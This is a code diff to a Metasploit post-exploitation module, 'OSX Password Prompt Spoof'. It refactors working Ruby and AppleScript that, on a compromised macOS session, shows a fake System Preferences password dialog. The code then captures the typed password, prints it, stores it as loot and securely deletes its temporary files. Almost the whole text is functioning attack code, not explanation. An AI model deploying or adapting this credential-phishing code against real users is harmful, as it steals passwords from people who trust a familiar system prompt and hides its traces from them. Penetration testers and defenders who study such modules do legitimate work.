@@ -10,39 +10,43 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Prompt the Mac OSX user for password credentials.',
+				'Name'          => 'OSX Password Prompt Spoof',
 				'Description'   => %q{
-					This module "spoofs" the OSX password prompt dialog, forcing a
-					logged-in user to type in a password and click Enter.
+					Presents a password prompt dialog to a logged-in OSX user.
 				},
 				'License'       => MSF_LICENSE,
-				'Author'        => [ 'Joff Thyer <jsthyer at gmail.com>',
-				                     'joev <jvennix[at]rapid7.com>' ],
+				'Author'        => [
+					'Joff Thyer <jsthyer[at]gmail.com>', # original post module
+					'joev <jvennix[at]rapid7.com>' # bug fixes
+				],
 				'Platform'      => [ 'osx' ],
+				'References'    => [
+					['URL', 'http://blog.packetheader.net/2011/10/fun-with-applescript.html']
+				],
 				'SessionTypes'  => [ "shell", "meterpreter" ]
 			))
 
-		register_options( [
+		register_options([
 			OptString.new(
-				'TEXTCREDS', 
+				'TEXTCREDS',
 				[
-					true, 
+					true,
 					'Text displayed when asking for password',
 					'Type your password to allow System Preferences to make changes'
 				]
 			),
 			OptString.new(
-				'ICONFILE', 
+				'ICONFILE',
 				[
-					true, 
+					true,
 					'Icon filename relative to bundle',
 					'UserUnknownIcon.icns'
 				]
 			),
 			OptString.new(
-				'BUNDLEPATH', 
+				'BUNDLEPATH',
 				[
-					true, 
+					true,
 					'Path to bundle containing icon',
 					'/System/Library/CoreServices/CoreTypes.bundle'
 				]
@@ -76,37 +80,37 @@ class Metasploit3 < Msf::Post
 		runme     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
 		creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
 		creds     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
-		passfile  = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
+		pass_file = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
 
-		username = cmd_exec("/usr/bin/whoami")
+		username = cmd_exec("/usr/bin/whoami").strip
 		cmd_exec("umask 0077")
 		cmd_exec("/bin/mkdir #{dir}")
 
 		# write the script that will launch things
-		write_file(runme,run_script())
+		write_file(runme, run_script)
 		cmd_exec("/bin/chmod 700 #{runme}")
 
 		# write the credentials script, compile and run
-		write_file(creds_osa,creds_script(passfile))
+		write_file(creds_osa,creds_script(pass_file))
 		cmd_exec("/usr/bin/osacompile -o #{creds} #{creds_osa}")
 		cmd_exec("#{runme} #{creds}")
 		print_status("Waiting for user '#{username}' to enter credentials...")
 
 		timeout = ::Time.now.to_f + datastore['TIMEOUT'].to_i
+		pass_found = false
 		while (::Time.now.to_f < timeout)
-			fileexist = cmd_exec("ls #{passfile}")
-			if fileexist !~ /No such file/
+			if ::File.exist?(pass_file)
 				print_status("Password entered! What a nice compliant user...")
+				pass_found = true
 				break
 			end
-			Kernel.select(nil, nil, nil, 0.5)
+			Rex.sleep(0.5)
 		end
 
-		if fileexist !~ /No such file/
-			password_data = cmd_exec("/bin/cat #{passfile}")
+		if pass_found
+			password_data = read_file("#{pass_file}").strip
 			print_status("password file contents: #{password_data}")
-			passf = store_loot("password", "text/plain", 
-				session, password_data, "passwd.pwd", "OSX Password")
+			passf = store_loot("password", "text/plain", session, password_data, "passwd.pwd", "OSX Password")
 			print_status("Password data stored as loot in: #{passf}")
 		else
 			print_status("Timeout period expired before credentials were entered!")
@@ -116,25 +120,24 @@ class Metasploit3 < Msf::Post
 		cmd_exec("/usr/bin/srm -rf #{dir}")
 	end
 
-
-	def run_script(wait=false)
-		ch = if wait == false then "&" else "" end
+	# "wraps" the #creds_script applescript and allows it to make UI calls
+	def run_script
 		%Q{
 			#!/bin/bash
-			osascript <<_EOF_ #{ch}
+			osascript <<EOF
 			set scriptfile to "$1"
 			tell application "AppleScript Runner"
 				do script scriptfile
 			end tell
-			_EOF_
+			EOF
 		}
 	end
 
-
-	def creds_script(passfile)
+	# applescript that displays the actual password prompt dialog
+	def creds_script(pass_file)
 		textcreds = datastore['TEXTCREDS']
 		ascript = %Q{
-			set filename to "#{passfile}"
+			set filename to "#{pass_file}"
 			set myprompt to "#{textcreds}"
 			set ans to "Cancel"
 			repeat
@@ -161,31 +164,18 @@ class Metasploit3 < Msf::Post
 				try
 					close access myfile
 				end try
-			end try 
+			end try
 		}
 	end
 
 	# Checks if the target is OSX Server
 	def check_server
-		# Get the OS Name
-		osx_ver = case session.type
-		when /meterpreter/
-			cmd_exec("/usr/bin/sw_vers", "-productName").chomp
-		when /shell/
-			session.shell_command_token("/usr/bin/sw_vers -productName").chomp
-		end
-
-		osx_ver =~ /Server/
+		cmd_exec("/usr/bin/sw_vers -productName").chomp  =~ /Server/
 	end
 
 	# Enumerate the OS Version
 	def get_ver
 		# Get the OS Version
-		case session.type
-		when /meterpreter/
-			cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
-		when /shell/
-			session.shell_command_token("/usr/bin/sw_vers -productVersion").chomp
-		end
+		cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
 	end
 end
